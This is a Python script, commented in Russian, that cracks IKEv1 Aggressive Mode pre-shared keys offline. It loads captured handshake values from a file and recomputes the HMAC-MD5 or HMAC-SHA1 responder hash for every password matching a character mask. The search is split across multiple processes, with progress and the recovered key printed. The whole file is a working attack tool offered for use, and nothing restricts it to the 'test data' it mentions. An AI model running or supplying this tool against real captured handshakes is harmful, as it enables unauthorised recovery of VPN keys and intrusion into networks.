import argparse
import hashlib
import hmac
import binascii
import itertools
import sys
import time
import multiprocessing
from multiprocessing import Pool, cpu_count, Manager
import threading
from datetime import datetime, timedelta

class IKEv1Cracker:
    def __init__(self, test_data_file):
        self.load_test_data(test_data_file)
        self.determine_hash_algorithm()
        self.found_password = None
        self.start_time = None
        
    def load_test_data(self, filename):
        with open(filename, 'r') as f:
            data = f.read().strip()
        
        parts = data.split('*')
        if len(parts) != 9:
            raise ValueError("Неверный формат тестовых данных")
        
        self.Ni = binascii.unhexlify(parts[0])
        self.Nr = binascii.unhexlify(parts[1])
        self.g_x = binascii.unhexlify(parts[2])
        self.g_y = binascii.unhexlify(parts[3])
        self.Ci = binascii.unhexlify(parts[4])
        self.Cr = binascii.unhexlify(parts[5])
        self.SAi = binascii.unhexlify(parts[6])
        self.IDr = binascii.unhexlify(parts[7])
        self.target_hash = binascii.unhexlify(parts[8])
        
    def determine_hash_algorithm(self):
        hash_size = len(self.target_hash)
        
        if hash_size == 16:  
            self.hash_algorithm = 'md5'
            self.hash_func = hashlib.md5
        elif hash_size == 20:  
            self.hash_algorithm = 'sha1'
            self.hash_func = hashlib.sha1
        else:
            raise ValueError("Неизвестный алгоритм хеширования с размером: {}".format(hash_size))
            
        print("Обнаружен алгоритм хеширования: {}".format(self.hash_algorithm.upper()))
    
    def generate_alphabets(self, mask):
        alphabets = []
        
        char_sets = {
            'a': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
            'd': '0123456789',
            'l': 'abcdefghijklmnopqrstuvwxyz',
            'u': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        }
        
        for char in mask:
            if char in char_sets:
                alphabets.append(char_sets[char])
            else:
                raise ValueError("Неизвестный символ маски: {}".format(char))
                
        return alphabets
    
    def compute_ike_hash(self, password):
        #SKEYID = prf(pre-shared-key, Ni_b | Nr_b)
        skeyid_input = self.Ni + self.Nr
        
        if self.hash_algorithm == 'md5':
            skeyid = hmac.new(password.encode(), skeyid_input, hashlib.md5).digest()
        else:  
            skeyid = hmac.new(password.encode(), skeyid_input, hashlib.sha1).digest()
        
        hash_input = (self.g_y + self.g_x + self.Cr + self.Ci + 
                     self.SAi + self.IDr)
        
        if self.hash_algorithm == 'md5':
            computed_hash = hmac.new(skeyid, hash_input, hashlib.md5).digest()
        else:  
            computed_hash = hmac.new(skeyid, hash_input, hashlib.sha1).digest()
            
        return computed_hash

    def status_monitor(self, total_combinations, shared_dict, check_interval=2):
        last_processed = 0
        iteration = 0
        
        while self.found_password is None:
            time.sleep(check_interval)
            iteration += 1
            
            current_processed = shared_dict.get('processed_combinations', 0)
            
            #вычисление статистики
            delta = current_processed - last_processed
            speed = delta / check_interval if iteration > 1 else 0
            
            if current_processed > 0:
                progress = (current_processed / total_combinations) * 100
                elapsed_time = time.time() - self.start_time
                
                if speed > 0:
                    remaining = total_combinations - current_processed
                    eta_seconds = remaining / speed
                    eta_time = datetime.now() + timedelta(seconds=eta_seconds)
                    eta_str = eta_time.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    eta_str = "вычисляется..."
                
                #очистка строки и вывод статуса
                sys.stdout.write('\r' + ' ' * 100 + '\r')
                sys.stdout.write(
                    "[СТАТУС] Прогресс: {:.2f}% | Обработано: {:,}/{:,} | "
                    "Скорость: {:.0f} пар/сек | Ожидаемое время окончания: {}".format(
                        progress, current_processed, total_combinations, 
                        speed, eta_str
                    )
                )
                sys.stdout.flush()
            
            last_processed = current_processed
            
            #проверка завершения каждые 10 итераций
            if iteration % 10 == 0:
                if current_processed >= total_combinations:
                    break

    def crack_password(self, mask, num_processes=None):

        if num_processes is None:
            num_processes = cpu_count()
            
        alphabets = self.generate_alphabets(mask)
        total_combinations = 1
        for alphabet in alphabets:
            total_combinations *= len(alphabet)
            
        print("Запуск подбора пароля с {} процессами...".format(num_processes))
        print("Маска: {}".format(mask))
        print("Длина пароля: {}".format(len(mask)))
        print("Всего комбинаций: {:,}".format(total_combinations))
        print("Время начала: {}".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        print("-" * 80)
        
        #разделение первого алфавита между процессами
        first_alphabet = alphabets[0]
        if len(first_alphabet) < num_processes:
            num_processes = len(first_alphabet)
            print("Уменьшено до {} процессов (ограничение размера алфавита)".format(num_processes))
        
        chunks = []
        chunk_size = len(first_alphabet) // num_processes
        
        for i in range(num_processes):
            start = i * chunk_size
            if i == num_processes - 1:
                end = len(first_alphabet)  #последний процесс берет остаток
            else:
                end = (i + 1) * chunk_size
            
            chunk_first_alphabet = first_alphabet[start:end]
            chunk_alphabets = [chunk_first_alphabet] + alphabets[1:]
            chunks.append(chunk_alphabets)
        
        self.start_time = time.time()
        self.found_password = None
        
        #использование Manager для создания разделяемого словаря
        with Manager() as manager:
            shared_dict = manager.dict()
            shared_dict['processed_combinations'] = 0
            shared_dict['found_password'] = None
            
            #запуск монитора статуса в отдельном потоке
            status_thread = threading.Thread(
                target=self.status_monitor, 
                args=(total_combinations, shared_dict),
                daemon=True
            )
            status_thread.start()
            
            try:
                with Pool(processes=num_processes) as pool:
                    #запуск процессов
                    results = []
                    for chunk in chunks:
                        result = pool.apply_async(
                            self._crack_chunk, 
                            (chunk, self.start_time, len(chunks), shared_dict)
                        )
                        results.append(result)
                    
                    #сборка результатов
                    for result in results:
                        password = result.get(timeout=3600)  
                        if password:
                            pool.terminate()
                            self.found_password = password
                            elapsed = time.time() - self.start_time
                            
                            #очистка строки статуса
                            sys.stdout.write('\r' + ' ' * 100 + '\r')
                            print("\n" + "="*80)
                            print("ПАРОЛЬ НАЙДЕН: {}".format(password))
                            print("Затраченное время: {:.2f} секунд".format(elapsed))
                            print("Время окончания: {}".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                            print("="*80)
                            return password
                
                #если пароль не найден
                elapsed = time.time() - self.start_time
                sys.stdout.write('\r' + ' ' * 100 + '\r')
                print("\n" + "="*80)
                print("ПАРОЛЬ НЕ НАЙДЕН")
                print("Затраченное время: {:.2f} секунд".format(elapsed))
                print("Время окончания: {}".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                print("Обработано комбинаций: {:,}".format(shared_dict['processed_combinations']))
                print("="*80)
                return None
                
            except KeyboardInterrupt:
                print("\n\nПроцесс прерван пользователем")
                pool.terminate()
                return None

    def _crack_chunk(self, alphabets_chunk, start_time, total_chunks, shared_dict):
        chunk_size = 1
        for alphabet in alphabets_chunk:
            chunk_size *= len(alphabet)
            
        attempts = 0
        last_update = 0
        update_interval = 1000  #обновление счетчика каждые 1000 попыток
        
        for password_chars in itertools.product(*alphabets_chunk):
            password = ''.join(password_chars)
            attempts += 1
            
            #обновление глобального счетчика
            if attempts - last_update >= update_interval:
                shared_dict['processed_combinations'] = shared_dict.get('processed_combinations', 0) + (attempts - last_update)
                last_update = attempts
            
            computed_hash = self.compute_ike_hash(password)
            
            if computed_hash == self.target_hash:
                #добавление последних попыток перед возвратом
                shared_dict['processed_combinations'] = shared_dict.get('processed_combinations', 0) + (attempts - last_update)
                return password
        
        #добавление оставшихся попыток
        shared_dict['processed_combinations'] = shared_dict.get('processed_combinations', 0) + (attempts - last_update)
        
        return None

def main():
    parser = argparse.ArgumentParser(description='Взломщик паролей IKEv1 Aggressive Mode')
    parser.add_argument('-m', '--mask', required=True,
                       help='Маска пароля (a=буквы и цифры, d=цифры, l=строчные буквы, u=заглавные буквы)')
    parser.add_argument('-p', '--processes', type=int, default=cpu_count(),
                       help='Количество параллельных процессов (по умолчанию: количество CPU)')
    parser.add_argument('test_file', help='Файл с тестовыми данными')
    
    args = parser.parse_args()
    
    try:
        cracker = IKEv1Cracker(args.test_file)
        password = cracker.crack_password(args.mask, args.processes)
        
        if password:
            print("УСПЕХ: Пароль найден!")
            sys.exit(0)
        else:
            print("НЕУДАЧА: Пароль не найден")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\nПроцесс прерван пользователем")
        sys.exit(1)
    except Exception as e:
        print("Ошибка: {}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    multiprocessing.set_start_method('spawn', force=True)
    main()